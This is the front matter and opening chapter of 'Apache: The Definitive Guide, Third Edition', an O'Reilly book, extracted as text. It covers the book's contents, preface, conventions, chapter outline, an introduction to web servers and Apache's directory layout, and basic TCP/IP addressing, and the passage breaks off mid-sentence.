 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
Section 8.2.  Rewrite 
       
 
Section 8.3.  Speling 
    
    
 
Chapter 9.  Proxying 
       
 
Section 9.1.  Security 
       
 
Section 9.2.  Proxy Directives 
       
 
Section 9.3.  Apparent Bug 
       
 
Section 9.4.  Performance 
       
 
Section 9.5.  Setup 

    
    
 
Chapter 10.  Logging 
       
 
Section 10.1.  Logging by Script and Database 
       
 
Section 10.2.  Apache's Logging Facilities 
       
 
Section 10.3.  Configuration Logging 
       
 
Section 10.4.  Status 
    
    
 
Chapter 11.  Security 
       
 
Section 11.1.  Internal and External Users 
       
 
Section 11.2.  Binary Signatures, Virtual Cash 
       
 
Section 11.3.  Certificates 
       
 
Section 11.4.  Firewalls 
       
 
Section 11.5.  Legal Issues 
       
 
Section 11.6.  Secure Sockets Layer (SSL) 
       
 
Section 11.7.  Apache's Security Precautions 
       
 
Section 11.8.  SSL Directives 
       
 
Section 11.9.  Cipher Suites 
       
 
Section 11.10.  Security in Real Life 
       
 
Section 11.11.  Future Directions 
    
    
 
Chapter 12.  Running a Big Web Site 
       
 
Section 12.1.  Machine Setup 
       
 
Section 12.2.  Server Security 
       
 
Section 12.3.  Managing a Big Site 
       
 
Section 12.4.  Supporting Software 
       
 
Section 12.5.  Scalability 
       
 
Section 12.6.  Load Balancing 
    
    
 
Chapter 13.  Building Applications 
       
 
Section 13.1.  Web Sites as Applications 
       
 
Section 13.2.  Providing Application Logic 
       
 
Section 13.3.  XML, XSLT, and Web Applications 
    
    
 
Chapter 14.  Server-Side Includes 
       
 
Section 14.1.  File Size 
       
 
Section 14.2.  File Modification Time 
       
 
Section 14.3.  Includes 
       
 
Section 14.4.  Execute CGI 
       
 
Section 14.5.  Echo 
       
 
Section 14.6.  Apache v2: SSI Filters 
    
    
 
Chapter 15.  PHP 
       
 
Section 15.1.  Installing PHP 
       
 
Section 15.2.  Site.php 
    
    
 
Chapter 16.  CGI and Perl 

       
 
Section 16.1.  The World of CGI 
       
 
Section 16.2.  Telling Apache About the Script 
       
 
Section 16.3.  Setting Environment Variables 
       
 
Section 16.4.  Cookies 
       
 
Section 16.5.  Script Directives 
       
 
Section 16.6.  suEXEC on Unix 
       
 
Section 16.7.  Handlers 
       
 
Section 16.8.  Actions 
       
 
Section 16.9.  Browsers 
    
    
 
Chapter 17.  mod_perl 
       
 
Section 17.1.  How mod_perl Works 
       
 
Section 17.2.  mod_perl Documentation 
       
 
Section 17.3.  Installing mod_perl — The Simple Way 
       
 
Section 17.4.  Modifying Your Scripts to Run Under mod_perl 
       
 
Section 17.5.  Global Variables 
       
 
Section 17.6.  Strict Pregame  
       
 
Section 17.7.  Loading Changes 
       
 
Section 17.8.  Opening and Closing Files 
       
 
Section 17.9.  Configuring Apache to Use mod_perl 
    
    
 
Chapter 18.  mod_jserv and Tomcat 
       
 
Section 18.1.  mod_jserv 
       
 
Section 18.2.  Tomcat 
       
 
Section 18.3.  Connecting Tomcat to Apache 
    
    
 
Chapter 19.  XML and Cocoon 
       
 
Section 19.1.  XML 
       
 
Section 19.2.  XML and Perl 
       
 
Section 19.3.  Cocoon 
       
 
Section 19.4.  Cocoon 1.8 and JServ 
       
 
Section 19.5.  Cocoon 2.0.3 and Tomcat 
       
 
Section 19.6.  Testing Cocoon 
    
    
 
Chapter 20.  The Apache API 
       
 
Section 20.1.  Documentation 
       
 
Section 20.2.  APR 
       
 
Section 20.3.  Pools 
       
 
Section 20.4.  Per-Server Configuration 
       
 
Section 20.5.  Per-Directory Configuration 
       
 
Section 20.6.  Per-Request Information 
       
 
Section 20.7.  Access to Configuration and Request Information 
       
 
Section 20.8.  Hooks, Optional Hooks, and Optional Functions 
       
 
Section 20.9.  Filters, Buckets, and Bucket Brigades 
       
 
Section 20.10.  Modules 
    

    
 
Chapter 21.  Writing Apache Modules 
       
 
Section 21.1.  Overview 
       
 
Section 21.2.  Status Codes 
       
 
Section 21.3.  The Module Structure 
       
 
Section 21.4.  A Complete Example 
       
 
Section 21.5.  General Hints 
       
 
Section 21.6.  Porting to Apache 2.0 
    
    
 
Appendix A.  The Apache 1.x API 
       
 
Section A.1.  Pools 
       
 
Section A.2.  Per-Server Configuration 
       
 
Section A.3.  Per-Directory Configuration 
       
 
Section A.4.  Per-Request Information 
       
 
Section A.5.  Access to Configuration and Request Information 
       
 
Section A.6.  Functions 
    
    
 
Colophon 
    
 
Index 
Copyright 
Copyright © O'Reilly & Associates, Inc.  
Printed in the United States of America. 
Published by O'Reilly & Associates, Inc., 1005 Gravenstein Highway North, Sebastopol, 
CA 95472. 
O'Reilly & Associates books may be purchased for educational, business, or sales 
promotional use. Online editions are also available for most titles 
(http://safari.oreilly.com). For more information, contact our corporate/institutional sales 
department: (800) 998-9938 or corporate@oreilly.com. 
Nutshell Handbook, the Nutshell Handbook logo, and the O'Reilly logo are registered 
trademarks of O'Reilly & Associates, Inc. Many of the designations used by 
manufacturers and sellers to distinguish their products are claimed as trademarks. Where 
those designations appear in this book, and O'Reilly & Associates, Inc. was aware of a 
trademark claim, the designations have been printed in caps or initial caps. The 
association between the image of Appaloosa horse and the topic of Apache is a trademark 
of O'Reilly & Associates, Inc. 
While every precaution has been taken in the preparation of this book, the publisher and 
authors assume no responsibility for errors or omissions, or for damages resulting from 
the use of the information contained herein. 

Preface 
Apache: The Definitive Guide, Third Edition, is principally about the Apache web-server 
software. We explain what a web server is and how it works, but our assumption is that 
most of our readers have used the World Wide Web and understand in practical terms 
how it works, and that they are now thinking about running their own servers and sites.  
This book takes the reader through the process of acquiring, compiling, installing, 
configuring, and modifying Apache. We exercise most of the package's functions by 
showing a set of example sites that take a reasonably typical web business — in our case, 
a postcard publisher — through a process of development and increasing complexity. 
However, we have deliberately tried to make each site as simple as possible, focusing on 
the particular feature being described. Each site is pretty well self-contained, so that the 
reader can refer to it while following the text without having to disentangle the meat from 
extraneous vegetables. If desired, it is possible to install and run each site on a suitable 
system.  
Perhaps it is worth saying what this book is not. It is not a manual, in the sense of 
formally documenting every command — such a manual exists on the Apache site and 
has been much improved with Versions 1.3 and 2.0; we assume that if you want to use 
Apache, you will download it and keep it at hand. Rather, if the manual is a road map that 
tells you how to get somewhere, this book tries to be a tourist guide that tells you why 
you might want to make the journey.  
In passing, we do reproduce some sections of the web site manual simply to save the 
reader the trouble of looking up the formal definitions as she follows the argument. 
Occasionally, we found the manual text hard to follow and in those cases we have 
changed the wording slightly. We have also interspersed comments as seemed useful at 
the time.  
This is not a book about HTML or creating web pages, or one about web security or even 
about running a web site. These are all complex subjects that should be either treated 
thoroughly or left alone. As a result, a webmaster's library might include books on the 
following topics:  
• 
The Web and how it works  
• 
HTML — formal definitions, what you can do with it  
• 
How to decide what sort of web site you want, how to organize it, and how to 
protect it  
• 
How to implement the site you want using one of the available servers (for 
instance, Apache)  
• 
Handbooks on Java, Perl, and other languages  
• 
Security  
Apache: The Definitive Guide is just one of the six or so possible titles in the fourth 
category.  

Apache is a versatile package and is becoming more versatile every day, so we have not 
tried to illustrate every possible combination of commands; that would require a book of 
a million pages or so. Rather, we have tried to suggest lines of development that a typical 
webmaster could follow once an understanding of the basic concepts is achieved.  
We realized from our own experience that the hardest stage of learning how to use 
Apache in a real-life context is right at the beginning, where the novice webmaster often 
has to get Apache, a scripting language, and a database manager to collaborate. This can 
be very puzzling. In this new edition we have therefore included a good deal of new 
material which tries to take the reader up these conceptual precipices. Once the 
collaboration is working, development is much easier. These new chapters are not 
intended to be an experts' account of, say, the interaction between Apache, Perl, and 
MySQL — but a simple beginners' guide, explaining how to make these things work with 
Apache. In the process we make some comments, from our own experience, on the merits 
of the various software products from which the user has to choose.  
As with the first and second editions, writing the book was something of a race with 
Apache's developers. We wanted to be ready as soon as Version 2 was stable, but not 
before the developers had finished adding new features.  
In many of the examples that follow, the motivation for what we make Apache do is 
simple enough and requires little explanation (for example, the different index formats in 
Chapter 7). Elsewhere, we feel that the webmaster needs to be aware of wider issues (for 
instance, the security issues discussed in Chapter 11) before making sensible decisions 
about his site's configuration, and we have not hesitated to branch out to deal with them.  
Who Wrote Apache, and Why? 
Apache gets its name from the fact that it consists of some existing code plus some 
patches. The FAQFAQ is netspeak for Frequently Asked Questions. Most sites/subjects 
have an FAQ file that tells you what the thing is, why it is, and where it's going. It is 
perfectly reasonable for the newcomer to ask for the FAQ to look up anything new to her, 
and indeed this is a sensible thing to do, since it reduces the number of questions asked. 
Apache's FAQ can be found at http://www.apache.org/docs/FAQ.html. thinks that this is 
cute; others may think it's the sort of joke that gets programmers a bad name. A more 
responsible group thinks that Apache is an appropriate title because of the 
resourcefulness and adaptability of the American Indian tribe.  
You have to understand that Apache is free to its users and is written by a team of 
volunteers who do not get paid for their work. Whether they decide to incorporate your or 
anyone else's ideas is entirely up to them. If you don't like what they do, feel free to 
collect a team and write your own web server or to adapt the existing Apache code — as 
many have.  
The first web server was built by the British physicist Tim Berners-Lee at CERN, the 
European Centre for Nuclear Research at Geneva, Switzerland. The immediate ancestor 

of Apache was built by the U.S. government's NCSA, the National Center for 
Supercomputing Applications. Because this code was written with (American) taxpayers' 
money, it is available to all; you can, if you like, download the source code in C from 
http://www.ncsa.uiuc.edu, paying due attention to the license conditions.  
There were those who thought that things could be done better, and in the FAQ for 
Apache (at http://www.apache.org ), we read:  
...Apache was originally based on code and ideas found in the most popular HTTP server 
of the time, NCSA httpd 1.3 (early 1995).  
That phrase "of the time" is nice. It usually refers to good times back in the 1700s or the 
early days of technology in the 1900s. But here it means back in the deliquescent bogs of 
a few years ago!  
While the Apache site is open to all, Apache is written by an invited group of (we hope) 
reasonably good programmers. One of the authors of this book, Ben, is a member of this 
group.  
Why do they bother? Why do these programmers, who presumably could be well paid for 
doing something else, sit up nights to work on Apache for our benefit? There is no such 
thing as a free lunch, so they do it for a number of typically human reasons. One might 
list, in no particular order:  
• 
They want to do something more interesting than their day job, which might be 
writing stock control packages for BigBins, Inc.  
• 
They want to be involved on the edge of what is happening. Working on a project 
like this is a pretty good way to keep up-to-date. After that comes consultancy on 
the next hot project.  
• 
The more worldly ones might remember how, back in the old days of 1995, quite 
a lot of the people working on the web server at NCSA left for a thing called 
Netscape and became, in the passage of the age, zillionaires.  
• 
It's fun. Developing good software is interesting and amusing, and you get to meet 
and work with other clever people.  
• 
They are not doing the bit that programmers hate: explaining to end users why 
their treasure isn't working and trying to fix it in 10 minutes flat. If you want 
support on Apache, you have to consult one of several commercial organizations 
(see Appendix A), who, quite properly, want to be paid for doing the work 
everyone loathes.  

The Demonstration Code 
The code for the demonstration web sites referred to throughout the book is available at 
http://www.oreilly.com/catalog/apache3/. It contains the requisite README file with 
installation instructions and other useful information. The contents of the download are 
organized into two directories:  
install/  
This directory contains scripts to install the sample sites:  
install  
Run this script to install the sites.  
install.conf  
Unix configuration file for install.  
installwin.conf  
Win32 configuration file for install.  
sites/  
This directory contains the sample sites used in the book.  
Conventions Used in This Book  
This section covers the various conventions used in this book. 
Typographic Conventions 
Constant width  
Used for HTTP headers, status codes, MIME content types, directives in 
configuration files, commands, options/switches, functions, methods, variable 
names, and code within body text  
Constant width bold 
Used in code segments to indicate input to be typed in by the user  
Constant width italic  
Used for replaceable items in code and text  

Italic  
Used for filenames, pathnames, newsgroup names, Internet addresses (URLs), 
email addresses, variable names (except in examples), terms being introduced, 
program names, subroutine names, CGI script names, hostnames, usernames, and 
group names  
Icons 
 
Text marked with this icon applies to the Unix version of Apache. 
 
Text marked with this icon applies to the Win32 version of Apache. 
 
This icon designates a note relating to the surrounding text.  
 
  
 
This icon designates a warning related to the surrounding text. 
 
Pathnames 
We use the text convention ... / to indicate your path to the demonstration sites, which 
may well be different from ours. For instance, on our Apache machine, we kept all the 
demonstration sites in the directory /usr/www. So, for example, our path would be 
/usr/www/site.simple. You might want to keep the sites somewhere other than /usr/www, 
so we refer to the path as ... /site.simple.  
Don't type .../ into your computer. The attempt will upset it!  

Directives 
Apache is controlled through roughly 150 directives. For each directive, a formal 
explanation is given in the following format:  
Directive 
  
 
Syntax 
Where used 
  
An explanation of the directive is located here. 
So, for instance, we have the following directive: 
ServerAdmin 
  
 
ServerAdmin email address 
Server config, virtual host 
  
ServerAdmin gives the email address for correspondence. It automatically generates 
error messages so the user has someone to write to in case of problems.  
The Where used line explains the appropriate environment for the directive. This will 
become clearer later.  
Organization of This Book 
The chapters that follow and their contents are listed here: 
Chapter 1  
Covers web servers, how Apache works, TCP/IP, HTTP, hostnames, what a client 
does, what happens at the server end, choosing a Unix version, and compiling and 
installing Apache under both Unix and Win32.  
Chapter 2  
Discusses getting Apache to run, creating Apache users, runtime flags, 
permissions, and site.simple.  
Chapter 3  
Introduces a demonstration business, Butterthlies, Inc.; some HTML; default 
indexing of web pages; server housekeeping; and block directives.  

Chapter 4  
Explains how to connect web sites to network addresses, including the common 
case where more than one web site is hosted at a given network address.  
Chapter 5  
Explains controlling access, collecting information about clients, cookies, DBM 
control, digest authentication, and anonymous access.  
Chapter 6  
Covers content and language arbitration, type maps, and expiration of 
information.  
Chapter 7  
Discusses better indexes, index options, your own indexes, and imagemaps.  
Chapter 8  
Describes Alias, ScriptAlias, and the amazing Rewrite module.  
Chapter 9  
Covers remote proxies and proxy caching.  
Chapter 10  
Explains Apache's facilities for tracking activity on your web sites.  
Chapter 11  
Explores the many aspects of protecting an Apache server and its content from 
uninvited guests and intruders, including user validation, binary signatures, virtual 
cash, certificates, firewalls, packet filtering, secure sockets layer (SSL), legal 
issues, patent rights, national security, and Apache-SSL directives.  
Chapter 12  
Explains best practices for running large sites, including support for multiple 
content-creators, separating test sites from production sites, and integrating the 
site with other Internet technologies.  

Chapter 13  
Explores the options available for using Apache to host automatically changing 
content and interactive applications.  
Chapter 14  
Explains using runtime commands in your HTML and XSSI — a more secure 
server-side include.  
Chapter 15  
Explains how to install and configure PHP, with an example for connecting it to 
MySQL.  
Chapter 16  
Demonstrates aliases, logs, HTML forms, a shell script, a CGI script in Perl, 
environment variables, and using MySQL through Perl and Apache.  
Chapter 17  
Demonstrates how to install, configure, and use the mod_perl module for efficient 
processing of Perl applications.  
Chapter 18  
Explains how to install these two modules for supporting Java in the Apache 
environment.  
Chapter 19  
Explains how to use XML in conjunction with Apache and how to install and 
configure the Cocoon set of tools for presenting XML content.  
Chapter 20  
Explores the foundations of the Apache 2.0 API.  
Chapter 21  
Describes how to create Apache modules using the Apache 2.0 Apache Portable 
Runtime, including how to port modules from 1.3 to 2.0.  

Appendix A  
Describes pools; per-server, per-directory, and per-request information; functions; 
warnings; and parsing.  
In addition, the Apache Quick Reference Card provides an outline of Apache 1.3 and 2.0 
syntax.  
Acknowledgments 
First, thanks to Robert S. Thau, who gave the world the Apache API and the code that 
implements it, and to the Apache Group, who worked on it before and have worked on it 
since. Thanks to Eric Young and Tim Hudson for giving SSLeay to the Web.  
Thanks to Bryan Blank, Aram Mirzadeh, Chuck Murcko, and Randy Terbush, who read 
early drafts of the first edition text and made many useful suggestions; and to John 
Ackermann, Geoff Meek, and Shane Owenby, who did the same for the second edition. 
For the third edition, we would like to thank our reviewers Evelyn Mitchell, Neil Neely, 
Lemon, Dirk-Willem van Gulik, Richard Sonnen, David Reid, Joe Johnston, Mike Stok, 
and Steven Champeon.  
We would also like to offer special thanks to Andrew Ford for giving us permission to 
reprint his Apache Quick Reference Card.  
Many thanks to Simon St.Laurent, our editor at O'Reilly, who patiently turned our text 
into a book — again. The two layers of blunders that remain are our own contribution.  
And finally, thanks to Camilla von Massenbach and Barbara Laurie, who have continued 
to put up with us while we rewrote this book.  

Chapter 1. Getting Started 
• 
 1.1 What Does a Web Server Do?  
• 
 1.2 How Apache Works  
• 
 1.3 Apache and Networking  
• 
 1.4 How HTTP Clients Work  
• 
 1.5 What Happens at the Server End?  
• 
 1.6 Planning the Apache Installation  
• 
 1.7 Windows?  
• 
 1.8 Which Apache?  
• 
 1.9 Installing Apache  
• 
 1.10 Building Apache 1.3.X Under Unix  
• 
 1.11 New Features in Apache v2  
• 
 1.12 Making and Installing Apache v2 Under Unix  
• 
 1.13 Apache Under Windows  
Apache is the dominant web server on the Internet today, filling a key place in the 
infrastructure of the Internet. This chapter will explore what web servers do and why you 
might choose the Apache web server, examine how your web server fits into the rest of 
your network infrastructure, and conclude by showing you how to install Apache on a 
variety of different systems.  
1.1 What Does a Web Server Do? 
The whole business of a web server is to translate a URL either into a filename, and then 
send that file back over the Internet, or into a program name, and then run that program 
and send its output back. That is the meat of what it does: all the rest is trimming.  
When you fire up your browser and connect to the URL of someone's home page — say 
the notional http://www.butterthlies.com/ we shall meet later on — you send a message 
across the Internet to the machine at that address. That machine, you hope, is up and 
running; its Internet connection is working; and it is ready to receive and act on your 
message.  
URL stands for Uniform Resource Locator. A URL such as http://www.butterthlies.com/ 
comes in three parts:  
<scheme>://<host>/<path> 
So, in our example, < scheme> is http, meaning that the browser should use HTTP 
(Hypertext Transfer Protocol); <host> is www.butterthlies.com ; and <path> is /, 
traditionally meaning the top page of the host.[1] The <host> may contain either an IP 
address or a name, which the browser will then convert to an IP address. Using HTTP 
1.1, your browser might send the following request to the computer at that IP address:  
GET / HTTP/1.1 

Host: www.butterthlies.com 
The request arrives at port 80 (the default HTTP port) on the host www.butterthlies.com. 
The message is again in four parts: a method (an HTTP method, not a URL method), that 
in this case is GET, but could equally be PUT, POST, DELETE, or CONNECT; the Uniform 
Resource Identifier (URI) /; the version of the protocol we are using; and a series of 
headers that modify the request (in this case, a Host header, which is used for name-
based virtual hosting: see Chapter 4). It is then up to the web server running on that host 
to make something of this message.  
The host machine may be a whole cluster of hypercomputers costing an oil sheik's 
ransom or just a humble PC. In either case, it had better be running a web server, a 
program that listens to the network and accepts and acts on this sort of message.  
1.1.1 Criteria for Choosing a Web Server 
What do we want a web server to do? It should: 
• 
Run fast, so it can cope with a lot of requests using a minimum of hardware.  
• 
Support multitasking, so it can deal with more than one request at once and so that 
the person running it can maintain the data it hands out without having to shut the 
service down. Multitasking is hard to arrange within a program: the only way to 
do it properly is to run the server on a multitasking operating system.  
• 
Authenticate requesters: some may be entitled to more services than others. When 
we come to handling money, this feature (see Chapter 11) becomes essential.  
• 
Respond to errors in the messages it gets with answers that make sense in the 
context of what is going on. For instance, if a client requests a page that the server 
cannot find, the server should respond with a "404" error, which is defined by the 
HTTP specification to mean "page does not exist."  
• 
Negotiate a style and language of response with the requester. For instance, it 
should — if the people running the server can rise to the challenge — be able to 
respond in the language of the requester's choice. This ability, of course, can open 
up your site to a lot more action. There are parts of the world where a response in 
the wrong language can be a bad thing.  
• 
Support a variety of different formats. On a more technical level, a user might 
want JPEG image files rather than GIF, or TIFF rather than either of those. He 
might want text in vdi format rather than PostScript.  
• 
Be able to run as a proxy server. A proxy server accepts requests for clients, 
forwards them to the real servers, and then sends the real servers' responses back 
to the clients. There are two reasons why you might want a proxy server:  
o The proxy might be running on the far side of a firewall (see Chapter 11), 
giving its users access to the Internet.  
o The proxy might cache popular pages to save reaccessing them.  
• 
Be secure. The Internet world is like the real world, peopled by a lot of lambs and 
a few wolves.[2] The aim of a good server is to prevent the wolves from troubling 

the lambs. The subject of security is so important that we will come back to it 
several times.  
1.1.2 Why Apache? 
Apache has more than twice the market share than its next competitor, Microsoft. This is 
not just because it is freeware and costs nothing. It is also open source,[3] which means 
that the source code can be examined by anyone so inclined. If there are errors in it, 
thousands of pairs of eyes scan it for mistakes. Because of this constant examination by 
outsiders, it is substantially more reliable[4] than any commercial software product that 
can only rely on the scrutiny of a closed list of employees. This is particularly important 
in the field of security, where apparently trivial mistakes can have horrible consequences.  
Anyone is free to take the source code and change it to make Apache do something 
different. In particular, Apache is extensible through an established technology for 
writing new Modules (described in more detail in Chapter 20), which many people have 
used to introduce new features.  
Apache suits sites of all sizes and types. You can run a single personal page on it or an 
enormous site serving millions of regular visitors. You can use it to serve static files over 
the Web or as a frontend to applications that generate customized responses for visitors. 
Some developers use Apache as a test-server on their desktops, writing and trying code in 
a local environment before publishing it to a wider audience. Apache can be an 
appropriate solution for practically any situation involving the HTTP protocol.  
Apache is freeware . The intending user downloads the source code and compiles it 
(under Unix) or downloads the executable (for Windows) from http://www.apache.org or 
a suitable mirror site. Although it sounds difficult to download the source code and 
configure and compile it, it only takes about 20 minutes and is well worth the trouble. 
Many operating system vendors now bundle appropriate Apache binaries.  
The result of Apache's many advantages is clear. There are about 75 web-server software 
packages on the market. Their relative popularity is charted every month by Netcraft 
(http://www.netcraft.com). In July 2002, their June survey of active sites, shown in Table 
1-1, had found that Apache ran nearly two-thirds of the sites they surveyed (continuing a 
trend that has been apparent for several years).  
Table 1-1. Active sites counted by Netcraft survey, June 2002  
Developer 
May 2002 
Percent 
June 2002 
Percent 
Apache 
10411000 
65.11 
10964734 
64.42 
Microsoft 
4121697 
25.78 
4243719 
24.93 
iPlanet 
247051 
1.55 
281681 
1.66 
Zeus 
214498 
1.34 
227857 
1.34 

1.2 How Apache Works 
Apache is a program that runs under a suitable multitasking operating system. In the 
examples in this book, the operating systems are Unix and Windows 
95/98/2000/Me/NT/..., which we call Win32. There are many others: flavors of Unix, 
IBM's OS/2, and Novell Netware. Mac OS X has a FreeBSD foundation and ships with 
Apache.  
The Apache binary is called httpd under Unix and apache.exe under Win32 and normally 
runs in the background.[5] Each copy of httpd/apache that is started has its attention 
directed at a web site, which is, for our purposes, a directory. Regardless of operating 
system, a site directory typically contains four subdirectories:  
conf  
Contains the configuration file(s), of which httpd.conf is the most important. It is 
referred to throughout this book as the Config file. It specifies the URLs that will 
be served.  
htdocs  
Contains the HTML files to be served up to the site's clients. This directory and 
those below it, the web space, are accessible to anyone on the Web and therefore 
pose a severe security risk if used for anything other than public data.  
logs  
Contains the log data, both of accesses and errors.  
cgi-bin  
Contains the CGI scripts. These are programs or shell scripts written by or for the 
webmaster that can be executed by Apache on behalf of its clients. It is most 
important, for security reasons, that this directory not be in the web space — that 
is, in .../htdocs or below.  
In its idling state, Apache does nothing but listen to the IP addresses specified in its 
Config file. When a request appears, Apache receives it and analyzes the headers. It then 
applies the rules it finds in the Config file and takes the appropriate action.  
The webmaster's main control over Apache is through the Config file. The webmaster has 
some 200 directives at her disposal, and most of this book is an account of what these 
directives do and how to use them to reasonable advantage. The webmaster also has a 
dozen flags she can use when Apache starts up.  

 
We've quoted most of the formal definitions of the directives directly 
from the Apache site manual pages because rewriting seemed 
unlikely to improve them, but very likely to introduce errors. In a 
few cases, where they had evidently been written by someone who 
was not a native English speaker, we rearranged the syntax a little. 
As they stand, they save the reader having to break off and go to the 
Apache site  
 
1.3 Apache and Networking 
At its core, Apache is about communication over networks. Apache uses the TCP/IP 
protocol as its foundation, providing an implementation of HTTP. Developers who want 
to use Apache should have at least a foundation understanding of TCP/IP and may need 
more advanced skills if they need to integrate Apache servers with other network 
infrastructure like firewalls and proxy servers.  
1.3.1 What to Know About TCP/IP 
To understand the substance of this book, you need a modest knowledge of what TCP/IP 
is and what it does. You'll find more than enough information in Craig Hunt and Robert 
Bruce Thompson's books on TCP/IP,[6] but what follows is, we think, what is necessary 
to know for our book's purposes.  
TCP/IP (Transmission Control Protocol/Internet Protocol) is a set of protocols enabling 
computers to talk to each other over networks. The two protocols that give the suite its 
name are among the most important, but there are many others, and we shall meet some 
of them later. These protocols are embodied in programs on your computer written by 
someone or other; it doesn't much matter who. TCP/IP seems unusual among computer 
standards in that the programs that implement it actually work, and their authors have not 
tried too much to improve on the original conceptions.  
TCP/IP is generally only used where there is a network.[7] Each computer on a network 
that wants to use TCP/IP has an IP address, for example, 192.168.123.1.  
There are four parts in the address, separated by periods. Each part corresponds to a byte, 
so the whole address is four bytes long. You will, in consequence, seldom see any of the 
parts outside the range 0 -255.  
Although not required by the protocol, by convention there is a dividing line somewhere 
inside this number: to the left is the network number and to the right, the host number. 
Two machines on the same physical network — usually a local area network (LAN) — 
normally have the same network number and communicate directly using TCP/IP.  
How do we know where the dividing line is between network number and host number? 
The default dividing line used to be determined by the first of the four numbers, but a 

shortage of addresses required a change to the use of subnet masks. These allow us to 
further subdivide the network by using more of the bits for the network number and less 
for the host number. Their correct use is rather technical, so we leave it to the routing 
experts. (You should not need to know the details of how this works in order to run a 
host, because the numbers you deal with are assigned to you by your network 
administrator or are just facts of the Internet.)  
Now we can think about how two machines with IP addresses X and Y talk to each other. 
If X and Y are on the same network and are correctly configured so that they have the 
